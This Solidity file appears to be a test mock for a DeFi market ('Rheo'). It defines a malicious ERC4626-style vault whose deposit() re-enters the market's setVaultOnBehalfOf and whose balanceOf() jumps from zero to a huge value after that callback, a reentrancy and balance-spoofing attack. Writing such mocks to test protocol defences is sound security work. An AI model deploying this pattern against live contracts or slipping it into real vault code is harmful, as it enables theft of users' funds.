// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {IRheo} from "@rheo-fm/src/market/interfaces/IRheo.sol";
import {SetVaultOnBehalfOfParams, SetVaultParams} from "@rheo-fm/src/market/libraries/actions/SetVault.sol";

contract MaliciousERC4626Reentrancy is Ownable {
    address public immutable asset;
    IRheo public size;
    address public onBehalfOf;
    uint256 public counter;

    constructor(address _asset) Ownable(msg.sender) {
        asset = _asset;
    }

    function setRheo(IRheo _size) external onlyOwner {
        size = _size;
    }

    function setOnBehalfOf(address _onBehalfOf) external onlyOwner {
        onBehalfOf = _onBehalfOf;
    }

    function balanceOf(address) public view returns (uint256) {
        if (counter == 0) {
            return 0;
        }
        return type(uint128).max;
    }

    function deposit(uint256 amount, address) public returns (uint256) {
        size.setVaultOnBehalfOf(
            SetVaultOnBehalfOfParams({
                params: SetVaultParams({vault: address(0), forfeitOldShares: false}),
                onBehalfOf: onBehalfOf
            })
        );
        counter++;
        return amount;
    }

    function convertToAssets(uint256 shares) external pure returns (uint256 assets) {
        return shares;
    }
}
